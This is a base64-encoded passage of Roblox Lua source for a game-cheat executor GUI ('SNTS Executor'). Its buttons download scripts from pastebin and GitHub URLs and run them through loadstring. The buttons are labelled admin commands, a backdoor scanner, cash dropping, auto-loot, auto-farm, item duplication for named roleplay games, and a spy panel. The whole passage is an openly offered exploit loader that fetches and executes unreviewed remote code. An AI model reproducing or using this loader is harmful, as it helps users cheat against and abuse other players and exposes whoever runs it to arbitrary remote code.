bC5UZXh0U2NhbGVkID0gdHJ1ZQoJbGFiZWwuUGFyZW50ID0gYnV0dG9uCgoJLS0gV2hlbiBjbGlja2VkOiBMb2FkIHRoZSByZW1vdGUgc2NyaXB0CglidXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJbGFiZWwuVGV4dCA9ICJMb2FkaW5nLi4uIgoJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQlsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCXJldHVybiBnYW1lOkh0dHBHZXQodXJsKQoJCQllbmQpCgkJCWlmIHN1Y2Nlc3MgdGhlbgoJCQkJbG9jYWwgcnVuU3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJCWxvYWRzdHJpbmcocmVzcG9uc2UpKCkKCQkJCWVuZCkKCQkJCWlmIHJ1blN1Y2Nlc3MgdGhlbgoJCQkJCWxhYmVsLlRleHQgPSBuYW1lIC4uICIiCgkJCQkJdGFzay53YWl0KDEuNSkKCQkJCQlsYWJlbC5UZXh0ID0gbmFtZQoJCQkJCS0tIHByaW50KCJbU05UUyBFeGVjdXRvcl0gTG9hZGVkOiIsIG5hbWUpCgkJCQllbHNlCgkJCQkJbGFiZWwuVGV4dCA9ICLimqDvuI8gRXJyb3IiCgkJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIEZhaWxlZCB0byBleGVjdXRlOiIsIG5hbWUsIGVycikKCQkJCWVuZAoJCQllbHNlCgkJCQlsYWJlbC5UZXh0ID0gIkZhaWxlZCIKCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBGYWlsZWQgdG8gZmV0Y2g6IiwgbmFtZSkKCQkJZW5kCgkJZW5kKQoJZW5kKQplbmQKCi0tIERlZmluZSBlYXN5LXRvLXVzZSBmdW5jdGlvbnMKZnVuY3Rpb24gYnV0dG9uKG5hbWUsIHVybCkKCWNyZWF0ZVVJQnV0dG9uKG5hbWUsIHVybCwgZmFsc2UpCmVuZAoKZnVuY3Rpb24gYWRkb25CdXR0b24obmFtZSwgdXJsKQoJY3JlYXRlVUlCdXR0b24obmFtZSwgdXJsLCB0cnVlKQplbmQKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gU0NSSVBUIExJU1QKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKYnV0dG9uKCJTTlRTIEVYRUNVVE9SIiwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hYmFjYWRhMDkxNy9FWEUvcmVmcy9oZWFkcy9tYWluL0VYRSIpCmJ1dHRvbigiUExBWUVSIFNUQVRVUyBNRU5VIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy94WnZHRThnTSIpCmJ1dHRvbigiQlJJTkcgUEFSVCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNXhKelVFMksiKQpidXR0b24oIlVOQU5DSE9SRUQgU0NBTk5FUiIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvV1pIVWdaN2YiKQpidXR0b24oIlVOQU5DSE9SRUQgQ09OVFJPTExFUiIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvV1pIVWdaN2YiKQpidXR0b24oIkFETUlOIENPTU1BTkQiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3hBczFHTUZhIikKYnV0dG9uKCJCQUNLRE9PUiBTQ0FOTkVSIiwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hYmFjYWRhMDkxNy9MSUtPRC1ORy1QSU5UVUFOL3JlZnMvaGVhZHMvbWFpbi9MSUtPRCUyME5HJTIwUElOVFVBTiIpCmJ1dHRvbigiRFJPUCBDQVNIIiwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hYmFjYWRhMDkxNy9EUk9QL3JlZnMvaGVhZHMvbWFpbi9EUk9QIikKYnV0dG9uKCJVTklWRVJTQUwgQVVUTyBMT09UIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy96a0NRNTk5cyIpCmJ1dHRvbigiVU5JVkVSU0FMIEFVVE8gRkFSTSIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvbkdHWUJjRlAiKQoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuRHVwZUNoZWF0CkcyTFsiMTBlIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbImY5Il0pOwpHMkxbIjEwZSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMTBlIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjEwZSJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vNzk3NTgxNzk3ODczMjVdXTsKRzJMWyIxMGUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDU0OSwgMCwgNDYzKTsKRzJMWyIxMGUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMGUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxMGUiXVsiTmFtZSJdID0gW1tEdXBlQ2hlYXRdXTsKRzJMWyIxMGUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA4ODQ5LCAwLCAwLjQ4ODI3LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELkR1cGVDaGVhdC5EaXNwbGF5TmFtZQpHMkxbIjEwZiJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjEwZSJdKTsKRzJMWyIxMGYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjEwZiJdWyJUZXh0U2l6ZSJdID0gMjU7CkcyTFsiMTBmIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjEwZiJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjEwZiJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMGYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxMGYiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMCk7CkcyTFsiMTBmIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyIxMGYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMGYiXVsiVGV4dCJdID0gW1tEVVBFIENIRUFUXV07CkcyTFsiMTBmIl1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIxMGYiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuRHVwZUNoZWF0LlNjcm9sbGluZ0ZyYW1lCkcyTFsiMTEwIl0gPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgRzJMWyIxMGUiXSk7CkcyTFsiMTEwIl1bIkFjdGl2ZSJdID0gdHJ1ZTsKRzJMWyIxMTAiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjExMCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMTAiXVsiU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTEwIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiMTEwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NTAsIDAsIDM0NSk7CkcyTFsiMTEwIl1bIlNjcm9sbEJhckltYWdlQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNDEsIDI0MSwgMjQxKTsKRzJMWyIxMTAiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CkcyTFsiMTEwIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTEwIl1bIlNjcm9sbEJhclRoaWNrbmVzcyJdID0gNTsKRzJMWyIxMTAiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELkR1cGVDaGVhdC5TY3JvbGxpbmdGcmFtZS5VSUxpc3RMYXlvdXQKRzJMWyIxMTEiXSA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgRzJMWyIxMTAiXSk7CkcyTFsiMTExIl1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiMTExIl1bIlBhZGRpbmciXSA9IFVEaW0ubmV3KDAsIDYpOwpHMkxbIjExMSJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuRHVwZUNoZWF0LlVJR3JhZGllbnQKRzJMWyIxMjEiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiMTBlIl0pOwpHMkxbIjEyMSJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbIjEyMSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuRHVwZUNoZWF0LlNjcm9sbGluZ0ZyYW1lCkcyTFsiMTEwIl0gPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgRzJMWyIxMGUiXSkKRzJMWyIxMTAiXVsiQWN0aXZlIl0gPSB0cnVlCkcyTFsiMTEwIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMApHMkxbIjExMCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpHMkxbIjExMCJdWyJTY3JvbGxCYXJJbWFnZVRyYW5zcGFyZW5jeSJdID0gMQpHMkxbIjExMCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCkcyTFsiMTEwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NTAsIDAsIDM0NSkKRzJMWyIxMTAiXVsiU2Nyb2xsQmFySW1hZ2VDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI0MSwgMjQxLCAyNDEpCkcyTFsiMTEwIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCkcyTFsiMTEwIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKRzJMWyIxMTAiXVsiU2Nyb2xsQmFyVGhpY2tuZXNzIl0gPSA1CkcyTFsiMTEwIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDEKCi0tIFNjcm9sbGluZ0ZyYW1lIExheW91dApHMkxbIjExMSJdID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBHMkxbIjExMCJdKQpHMkxbIjExMSJdWyJIb3Jpem9udGFsQWxpZ25tZW50Il0gPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuQ2VudGVyCkcyTFsiMTExIl1bIlBhZGRpbmciXSA9IFVEaW0ubmV3KDAsIDYpCkcyTFsiMTExIl1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKCi0tIEdyYWRpZW50IGZvciBEdXBlQ2hlYXQKRzJMWyIxMjEiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiMTBlIl0pCkcyTFsiMTIxIl1bIlJvdGF0aW9uIl0gPSAtOTAKRzJMWyIxMjEiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3KHsKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDU4LCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTg4LCBDb2xvcjMuZnJvbVJHQigxNzEsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSkKfSkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gRHVwZUNoZWF0IENvbm5lY3RlZCBTY3JpcHQgQnV0dG9ucwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBEdXBlQ2hlYXRGcmFtZSA9IEcyTFsiMTEwIl0gLS0gdGhpcyBpcyB0aGUgU2Nyb2xsaW5nRnJhbWUgd2hlcmUgYnV0dG9ucyBhcHBlYXIKCi0tIEhlbHBlciB0byBjcmVhdGUgYnV0dG9ucwpsb2NhbCBmdW5jdGlvbiBjcmVhdGVVSUJ1dHRvbihuYW1lLCB1cmwsIGlzQWRkb24pCglsb2NhbCBidXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQoJYnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgMzYwLCAwLCA0OSkKCWJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gaXNBZGRvbiBhbmQgQ29sb3IzLmZyb21SR0IoNjAsIDMwLCAzMCkgb3IgQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNykKCWJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglidXR0b24uVGV4dCA9ICIiCglidXR0b24uUGFyZW50ID0gRHVwZUNoZWF0RnJhbWUKCglsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYnV0dG9uKQoKCWxvY2FsIGxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQoJbGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKCWxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQoJbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLCAzMDAsIDAsIDQwKQoJbGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCWxhYmVsLlRleHQgPSBuYW1lCglsYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKCWxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoJbGFiZWwuVGV4dFNjYWxlZCA9IHRydWUKCWxhYmVsLlBhcmVudCA9IGJ1dHRvbgoKCS0tIFdoZW4gY2xpY2tlZDogTG9hZCB0aGUgcmVtb3RlIHNjcmlwdAoJYnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCWxhYmVsLlRleHQgPSAiTG9hZGluZy4uLiIKCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJbG9jYWwgc3VjY2VzcywgcmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQlyZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkKCQkJZW5kKQoJCQlpZiBzdWNjZXNzIHRoZW4KCQkJCWxvY2FsIHJ1blN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlsb2Fkc3RyaW5nKHJlc3BvbnNlKSgpCgkJCQllbmQpCgkJCQlpZiBydW5TdWNjZXNzIHRoZW4KCQkJCQlsYWJlbC5UZXh0ID0gbmFtZSAuLiAiIgoJCQkJCXRhc2sud2FpdCgxLjUpCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUKCQkJCQktLSBwcmludCgiW1NOVFMgRHVwZUNoZWF0XSBMb2FkZWQ6IiwgbmFtZSkKCQkJCWVsc2UKCQkJCQlsYWJlbC5UZXh0ID0gIuKaoO+4jyBFcnJvciIKCQkJCQktLSB3YXJuKCJbU05UUyBFUlJPUl0gRmFpbGVkIHRvIGV4ZWN1dGU6IiwgbmFtZSwgZXJyKQoJCQkJZW5kCgkJCWVsc2UKCQkJCWxhYmVsLlRleHQgPSAiRmFpbGVkIgoJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIEZhaWxlZCB0byBmZXRjaDoiLCBuYW1lKQoJCQllbmQKCQllbmQpCgllbmQpCmVuZAoKLS0gRGVmaW5lIGVhc3ktdG8tdXNlIGZ1bmN0aW9ucwpmdW5jdGlvbiBkdXBlQnV0dG9uKG5hbWUsIHVybCkKCWNyZWF0ZVVJQnV0dG9uKG5hbWUsIHVybCwgZmFsc2UpCmVuZAoKZnVuY3Rpb24gZHVwZUFkZG9uKG5hbWUsIHVybCkKCWNyZWF0ZVVJQnV0dG9uKG5hbWUsIHVybCwgdHJ1ZSkKZW5kCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tLy8gW1NOVFMgRVhFQ1VUT1JdIERVUEVDSEVBVCBTQ1JJUFQgTElTVAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpkdXBlQnV0dG9uKCJHVU4gU0hPUCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNlVMSEhSZFciKQpkdXBlQnV0dG9uKCJCTSBTVE9SQUdFIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9YUzl1aFN6USIpCmR1cGVCdXR0b24oIlBVUkNIQVNFIEVWRU5UIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9UOHhXYjJEOSIpCmR1cGVCdXR0b24oIk5FWE9QT0xJUyIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvODJuem5oUXgiKQpkdXBlQnV0dG9uKCJCVUhBWSBCQVJBTkdBWSBSUCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaW56RFNHV24iKQpkdXBlQnV0dG9uKCJET1dOVE9XTiBQSU5BUyBSUCIsICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWJhY2FkYTA5MTcvRE9XTlRPV04tT04tRE9XTi9yZWZzL2hlYWRzL21haW4vQk9CTyIpCmR1cGVCdXR0b24oIkRPV05UT1dOIEJNIFNUT1JBR0UiLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FiYWNhZGEwOTE3L0RPV05UT1dOLVNVUEVSLURPV04vcmVmcy9oZWFkcy9tYWluL0RPV05UT1dOJTIwVEFOR0EiKQpkdXBlQnV0dG9uKCJTVElNIFJQIiwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hYmFjYWRhMDkxNy9CSVNBWUEvcmVmcy9oZWFkcy9tYWluL1NUSU0iKQpkdXBlQnV0dG9uKCJQQVJBSVNPIENJVFkgUlAiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NNNnk4S0JKIikKZHVwZUJ1dHRvbigiS0FMWUUgT05TRSBSUCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveDRaNnhxZ3giKQpkdXBlQnV0dG9uKCJQQVJFU0FOIE5JIERJV0FUQSIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvdUVyUmZFRk0iKQpkdXBlQnV0dG9uKCJCQUdPTkcgQkFSWU8gU1BBV04gQVlVREEiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1VidmUwSGpRIikKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlNweSZEZWJ1Z3MKRzJMWyIxMjIiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiZjkiXSk7CkcyTFsiMTIyIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxMjIiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTIyIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjEyMiJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vNzIwMzc2Njc1NDE4ODBdXTsKRzJMWyIxMjIiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDU0OSwgMCwgMzE2KTsKRzJMWyIxMjIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMjIiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxMjIiXVsiTmFtZSJdID0gW1tTcHkmRGVidWdzXV07CkcyTFsiMTIyIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjA2MTExLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlNweSZEZWJ1Z3MuRGlzcGxheU5hbWUKRzJMWyIxMjMiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIxMjIiXSk7CkcyTFsiMTIzIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxMjMiXVsiVGV4dFNpemUiXSA9IDI1OwpHMkxbIjEyMyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMjMiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyIxMjMiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTIzIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTIzIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjEyMyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMTIzIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTIzIl1bIlRleHQiXSA9IFtbU1BZICYgREVCVUdTXV07CkcyTFsiMTIzIl1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIxMjMiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuU3B5JkRlYnVncy5TY3JvbGxpbmdGcmFtZQpHMkxbIjEyNCJdID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIsIEcyTFsiMTIyIl0pOwpHMkxbIjEyNCJdWyJBY3RpdmUiXSA9IHRydWU7CkcyTFsiMTI0Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxMjQiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTI0Il1bIlNjcm9sbEJhckltYWdlVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjEyNCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbIjEyNCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNDQ4LCAwLCAxOTUpOwpHMkxbIjEyNCJdWyJTY3JvbGxCYXJJbWFnZUNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjQxLCAyNDEsIDI0MSk7CkcyTFsiMTI0Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwpHMkxbIjEyNCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjEyNCJdWyJTY3JvbGxCYXJUaGlja25lc3MiXSA9IDU7CkcyTFsiMTI0Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5TcHkmRGVidWdzLlNjcm9sbGluZ0ZyYW1lLlVJTGlzdExheW91dApHMkxbIjEyNSJdID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBHMkxbIjEyNCJdKTsKRzJMWyIxMjUiXVsiSG9yaXpvbnRhbEFsaWdubWVudCJdID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyIxMjUiXVsiUGFkZGluZyJdID0gVURpbS5uZXcoMCwgNik7CkcyTFsiMTI1Il1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlNweSZEZWJ1Z3MuU2Nyb2xsaW5nRnJhbWUuVGV4dEJ1dHRvbi5VSUNvcm5lcgpHMkxbIjEyNyJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiMTI2Il0pOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5TcHkmRGVidWdzLlVJR3JhZGllbnQKRzJMWyIxMzUiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiMTIyIl0pOwpHMkxbIjEzNSJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbIjEzNSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKS